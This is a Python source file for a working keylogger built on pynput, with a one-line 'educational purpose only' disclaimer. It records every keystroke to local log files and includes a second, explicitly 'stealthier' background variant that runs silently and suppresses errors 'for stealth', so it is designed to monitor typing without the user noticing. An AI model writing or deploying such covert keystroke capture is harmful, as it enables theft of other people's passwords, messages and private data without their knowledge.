# EDUCATIONAL PURPOSE ONLY - Only use on your own devices
# This demonstrates how keyboard monitoring works conceptually

from pynput import keyboard
import logging
import os
from datetime import datetime

class KeyLogger:
    def __init__(self, log_file="keystrokes.log"):
        self.log_file = log_file
        self.setup_logging()
        
    def setup_logging(self):
        """Configure logging to capture keystrokes"""
        logging.basicConfig(
            filename=self.log_file,
            level=logging.DEBUG,
            format='%(asctime)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        
    def on_press(self, key):
        """Callback function when a key is pressed"""
        try:
            # Handle regular characters
            if hasattr(key, 'char') and key.char is not None:
                logging.info(f'Key pressed: {key.char}')
                # Also append to a simple text file for easy reading
                with open("keystrokes_raw.txt", "a", encoding='utf-8') as f:
                    f.write(key.char)
            else:
                # Handle special keys
                special_key = str(key).replace("Key.", "")
                logging.info(f'Special key pressed: {special_key}')
                # Mark special keys in raw file
                with open("keystrokes_raw.txt", "a", encoding='utf-8') as f:
                    f.write(f"[{special_key}]")
                    
        except Exception as e:
            logging.error(f"Error capturing key: {e}")
            
    def on_release(self, key):
        """Callback when a key is released"""
        # Stop listener if ESC is pressed (optional exit condition)
        if key == keyboard.Key.esc:
            print("Keylogger stopped. Log saved to file.")
            return False
            
    def start(self):
        """Start the keylogger"""
        print("Keylogger started. Press ESC to stop...")
        print(f"Keystrokes are being logged to: {self.log_file}")
        
        # Start listening for keyboard events
        with keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        ) as listener:
            listener.join()

# Alternative: Stealthier version that runs in background
class BackgroundKeyLogger:
    """Runs silently without console output"""
    
    def __init__(self, log_file="keystrokes.log"):
        self.log_file = log_file
        self.logging_enabled = True
        
    def on_press(self, key):
        """Silent capture without console output"""
        if not self.logging_enabled:
            return
            
        try:
            with open(self.log_file, "a", encoding='utf-8') as f:
                if hasattr(key, 'char') and key.char is not None:
                    f.write(key.char)
                else:
                    f.write(f" [{str(key)}] ")
        except:
            pass  # Fail silently for stealth
            
    def start_background(self):
        """Run in background"""
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        return listener
        
    def stop(self, listener):
        """Stop logging"""
        self.logging_enabled = False
        listener.stop()

# Example usage
if __name__ == "__main__":
    # Method 1: With console output (for testing)
    logger = KeyLogger()
    
    try:
        logger.start()
    except KeyboardInterrupt:
        print("\nKeylogger stopped by user.")
        print(f"Check {logger.log_file} for keystroke data")
    
    # Method 2: Background version (uncomment to use)
    """
    bg_logger = BackgroundKeyLogger()
    listener = bg_logger.start_background()
    
    input("Keylogger running in background. Press Enter to stop...\n")
    
    bg_logger.stop(listener)
    print("Logging stopped. Check keystrokes.log")
    """
